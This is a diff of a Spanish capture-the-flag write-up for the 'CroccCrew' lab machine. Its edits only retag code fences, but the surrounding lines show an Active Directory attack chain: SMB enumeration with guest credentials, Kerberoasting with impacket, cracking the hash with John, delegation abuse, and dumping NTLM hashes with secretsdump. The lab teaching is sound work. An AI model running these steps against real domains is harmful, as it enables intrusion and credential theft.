@@ -77,7 +77,7 @@ ya con eso aprendido haremos un
 
 `curl http://10.10.140.48/robots.txt`
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ curl http://10.10.47.234/robots.txt
 User-Agent: *
@@ -115,7 +115,7 @@ $('body').terminal({
 ````	
 nada interesante, probemos con el directorio `/db-config.bak`
 
-````html
+````php
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ curl http://10.10.47.234//db-config.bak   
 <?php
@@ -173,7 +173,7 @@ USER=Visitor PASSWORD=GuestLogin! si le damos abajo y intentamos cambiar de usua
 
 ya fuera de rdesktop tendremos las credenciales para smbclient asi que intentemos loguearnos, `smbclient -L 10.10.140.48 -U 'Visitor'`
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ smbclient -L 10.10.47.234 -U 'Visitor'
 Password for [WORKGROUP\Visitor]:
@@ -208,7 +208,7 @@ con eso aprendido podemos comenzar
 
 `smbmap -H 10.10.140.48 -u "Visitor" -p "GuestLogin\!" -r Home`
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~]
 └─$ smbmap -H 10.10.47.234 -u "Visitor" -p "GuestLogin\!" -r Home
 [+] IP: 10.10.47.234:445	Name: 10.10.47.234                                      
@@ -233,7 +233,7 @@ haremos un `ls` y ahi estara en nuestro directorio, le haremos un cat para ver l
 
 `cat 10.10.140.48-Home_user.txt`
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ smbmap -H 10.10.47.234 -u "Visitor" -p "GuestLogin\!" -r Home --download Home/user.txt
 [+] Starting download: Home\user.txt (17 bytes)
@@ -256,7 +256,7 @@ cuando usemos impacket.
 
 haremos un crackmapexec `smb 10.10.206.226 -u 'Visitor' -p 'GuestLogin!'`
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ crackmapexec smb 10.10.47.234 -u 'Visitor' -p 'GuestLogin!'
 /usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
@@ -305,7 +305,7 @@ si no se confian de como sacamos y sabemos de que ese era el usuario, pues usare
 
 ahora si, haremos un `enum4linux -u 'Visitor' -p 'GuestLogin!' -U 10.10.140.48` 
 
-````yaml
+````bash
 mora@H3nT4i:~$ enum4linux -u 'Visitor' -p 'GuestLogin!' -U 10.10.47.234
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May 18 14:43:46 2022
 
@@ -410,7 +410,7 @@ con esto aprendido podemos comenzar:
 
 haremos un `impacket-GetUserSPNs 'COOCTUS.CORP/Visitor:GuestLogin!' -dc-ip 10.10.140.48 -request -outputfile TGS.txt`
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ impacket-GetUserSPNs 'COOCTUS.CORP/Visitor:GuestLogin!' -dc-ip 10.10.47.234 -request -outputfile TGS.txt
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -431,7 +431,7 @@ para ver si podemos encontrar una cuenta de servicio para abusar.
 
 si hacen un `cat TGS.txt` veran que nos dejo un HASH, intentemos romperlo con John The Ripper.
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ cat TGS.txt 
 $krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$55e86b71f95ce0d2ce585af36adaef82$0a0j4
@@ -457,7 +457,7 @@ a44bc1e3be560e3480ce92dbb54f8bd5bb58b407b6483b378a0a5f775175eb161aa81872bbe53
 
 haremos un  `john TGS.txt -w=/usr/share/wordlists/rockyou.txt`
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ john TGS.txt -w=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
@@ -477,7 +477,7 @@ ahora haremos un:
 
 `impacket-findDelegation -debug  COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.206.226`
 
-````yaml
+````bash
 ┌──(samsepi0l㉿kali)-[~/CroccCrew]
 └─$ impacket-findDelegation -debug  COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.47.234           
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -508,7 +508,7 @@ ahora haremos un `export KRB5CCNAME=Administrator.ccache` para el uso de la secu
 
 para ahorrarnos futuros errores y tiempo añadiremos esto a nuestra /etc/hosts con la ip de su maquina ( DC.COOCTUS.CORP ) eso añadiran claramente ira sin los parentesis, aqui un ejemplo de como tuvo que quedar
 
-```html
+```bash
 ___________________________________________________________
 127.0.0.1       localhost
 127.0.1.1       kali
@@ -526,7 +526,7 @@ Una vez que hayamos hecho eso, debería volcar con éxito los hashes NTLM del us
 
 el hash que colocaras tendria que ser como este:
 
-```html
+```bash
 ❯ impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
